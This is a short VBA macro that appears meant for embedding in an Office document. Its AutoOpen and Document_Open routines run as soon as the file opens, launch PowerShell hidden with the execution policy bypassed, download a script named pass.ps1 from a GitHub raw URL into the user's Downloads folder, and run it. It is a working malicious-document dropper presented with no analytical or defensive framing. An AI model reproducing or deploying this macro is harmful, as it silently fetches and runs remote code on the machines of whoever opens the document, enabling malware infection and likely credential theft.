Sub AutoOpen()
    ' This macro runs automatically when the document opens
    Dim objShell As Object
    Dim powershellPath As String
    Dim downloadUrl As String
    Dim outputFile As String
    Dim psCommand As String
    
    ' Create shell object
    Set objShell = CreateObject("WScript.Shell")
    
    ' Configure your download here
    downloadUrl = "https://github.com/5hank4r/pass/raw/refs/heads/main/pass.ps1"
    outputFile = "ss.ps1"  ' Note: Use .ps1 extension for PowerShell scripts
    
    ' Path to PowerShell
    powershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    ' Build PowerShell command: change directory, download file, then execute it
    psCommand = "Set-Location $env:USERPROFILE\Downloads; " & _
                "Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile " & outputFile & "; " & _
                ".\" & outputFile
    
    ' Check if PowerShell exists
    If Dir(powershellPath) <> "" Then
        ' Run PowerShell minimized (6 = minimized without focus)
        objShell.Run powershellPath & " -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & psCommand & """", 0, False
    Else
        MsgBox "PowerShell not found!", vbExclamation
    End If
    
    ' Clean up
    Set objShell = Nothing
    
End Sub

Sub Document_Open()
    ' Alternative auto-run macro name
    AutoOpen
End Sub
